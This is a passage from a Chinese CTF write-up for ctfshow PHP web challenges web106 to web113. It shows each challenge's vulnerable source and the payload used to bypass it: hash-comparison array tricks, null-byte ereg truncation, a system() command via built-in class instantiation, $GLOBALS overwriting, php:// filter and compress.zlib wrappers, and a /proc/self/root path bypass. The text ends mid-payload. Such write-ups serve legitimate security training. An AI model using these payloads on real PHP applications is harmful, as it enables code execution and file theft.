<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现是sha1弱比较，所以继续用传进数组得到NULL进行绕过<br>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>postv1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>成功拿到flag：ctfshow{ff006892-2331-47d9-8924-61d1c515c272}</p><h4 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>parse_str</strong>    ( string <code>$enc``o``ded_stri``n``g</code>   [, array <code>&amp;$re``s``u``l``t</code>  ] )<br>参数</p><p><code>e``n``c``oded_s``t``rin``g</code></p><p>输入的字符串。       </p><p><code>r``es``u``lt</code></p><p>如果设置了第二个变量 <code>result</code>，       变量将会以数组元素的形式存入到这个数组，作为替代。例子：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"first=value&amp;arr[]=foo+bar&amp;arr[]=baz"</span><span class="token punctuation">;</span><span class="token comment">// 推荐用法</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'first'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// value</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arr'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// foo bar</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arr'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// baz</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们只需要将$v2[‘flag’]=NULL即可，再将v3作为数组传进即可<br>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>postv1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token constant">NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到flag：ctfshow{6189fec9-0a12-4abe-9727-25df29d8c31c}</p><h4 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//只有36d的人才能看到flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ere****g()</strong> 函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false。搜索对于字母字符是区分大小写的<br><strong>strrev()</strong> 函数反转字符串。</p><p><strong>i<strong><strong>n</strong></strong>tv<strong><strong>a</strong></strong>l()</strong> 函数用于获取变量的整数值</p><p>通过查阅资料知道了%00可以将ereg()函数截断，正则表达式只会匹配%00之前的，所以可以构造payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>a<span class="token operator">%</span><span class="token number">00778</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为经过strren()函数后会变成877%00a，再经过intval函数取整，得到877,等于16进制的36d<br>拿到flag：ctfshow{771cf43b-74b1-434e-b31c-663f958c2e37}</p><h4 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里又学到一个新的知识点php内置类，让v1不报错，v2执行命令即可</p><ul><li>Error</li><li>Exception：处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类</li><li>DirectoryIterator</li><li>SimpleXMLElement</li><li><strong>Reflect<strong><strong>ion</strong></strong>Cla<strong><strong>s</strong></strong>s</strong> 或者 <strong>R<strong><strong>e</strong></strong>f<strong><strong>lect</strong></strong>ionMethod</strong> 都为常用的反射类，可以理解为一个类的映射<br>payload：</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php">使用以上任意一个给v1即可，<span class="token operator">?</span>v1<span class="token operator">=</span>Error<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac fl*.*"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿到flag：ctfshow{446d9c56-452a-4b68-80bf-9824eb85090b}</p><h4 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又一个新的知识点，FilesystemIterator类的使用(作用就是获取当前目录文件)<br>（DirectoryIterator类获取目录）</p><p>所以我们只需要再得到一个点或者路径就可以查看当前目录下的文件,我们使用getcwd()(获取当前目录)</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span>FilesystemIterator<span class="token operator">&amp;</span>v2<span class="token operator">=</span>getcwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现一个文件，直接访问即可<br><img src="/images/web_110.png"></p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">得到flag：ctfshow&#123;70e909b5-8f13-4938-ba8a-52f2a857d24d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题考的变量覆盖<br>$GLOBALS — 引用全局作用域中可用的全部变量，关联数组 array，包含当前脚本内定义成全局范围的所有变量的引用。 数组的键就是变量的名字。</p><p>然后v1中要有ctfshow，则payload为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token constant">GLOBALS</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可拿到flag：ctfshow{a241886a-80f6-42d3-a2f0-ce9a7cd474b1}</p><h4 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PHP Filter :PHP 过滤器用于对来自非安全来源的数据（比如用户输入）进行验证和过滤。<br>is_file(): 函数检查指定的文件名是否是正常的文件。(如果文件存在且为正常的文件，则返回 true)</p><p>首先会经过if判断，!is_file(),也就是说不能是正常的文件名，而highlight_file()又可以用php伪协议进行绕过来读取，payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag：ctfshow{2922a050-d042-49db-84d7-616e379a3cde}</p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次多了个filter，便不能再用上次的payload了，去看了看php的相关资料，发现还有压缩流协议</p><ul><li>compress.zlib://file.gz</li><li>compress.bzip2://file.bz2</li><li>zip://archive.zip#dir/file.txt<br>所以payload：</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>compress<span class="token operator">.</span>zlib<span class="token punctuation">:</span><span class="token comment">//flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag：ctfshow{6eb385d9-3ade-4feb-b809-785d028182f5}<br>但看一个大佬的给出的解法：</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token operator">.</span>php<span aria-hidden="true" 